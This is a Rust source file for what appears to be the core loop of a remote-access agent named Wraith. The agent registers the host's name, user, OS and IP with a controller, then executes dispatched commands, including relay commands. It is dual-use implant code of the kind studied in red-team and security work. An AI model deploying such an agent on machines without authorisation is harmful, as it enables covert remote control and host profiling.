use crate::connection::tcp::TcpConnection;
use crate::connection::Connection;
use crate::message::codec::MessageCodec;
use crate::proto::wraith::{MessageType, WraithMessage};
use crate::wraith::state::WraithState;
use crate::wraith::dispatcher::MessageDispatcher;
use crate::relay::RelayManager;
use log::{error, info};
use std::sync::{Arc, Mutex};

pub struct Wraith {
    connection: TcpConnection,
    state: Arc<Mutex<WraithState>>,
    dispatcher: MessageDispatcher,
}

impl Wraith {
    pub fn new(host: String, port: u16, is_server: bool) -> Self {
        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
        let relay_commands = crate::commands::relay::RelayCommands::new(relay_manager.clone());

        Self {
            connection: TcpConnection::new(host, port, is_server),
            state,
            dispatcher: MessageDispatcher::new(relay_commands),
        }
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.connection.is_server() {
            self.connection.listen().await?;
        } else {
            self.connection.connect().await?;
        }

        self.state.lock().unwrap().set_connected(true);
        self.register().await?;

        loop {
            match self.connection.read_message().await {
                Ok(msg) => {
                    let msg_type = msg.msg_type;
                    match msg_type {
                        x if x == MessageType::Command as i32 => {
                            if let Some(response) = self.dispatcher.dispatch(msg, self.state.clone()).await {
                                self.connection.send_message(&response).await?;
                            }
                        }
                        _ => {
                            info!("Received message type: {}", msg_type);
                        }
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }

        self.state.lock().unwrap().set_connected(false);
        Ok(())
    }

    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let state = self.state.lock().unwrap();
        let msg = MessageCodec::create_registration(
            state.hostname.clone(),
            state.username.clone(),
            state.os.clone(),
            state.ip_address.clone(),
        );
        drop(state);

        self.connection.send_message(&msg).await?;
        info!("Registration sent");
        Ok(())
    }
}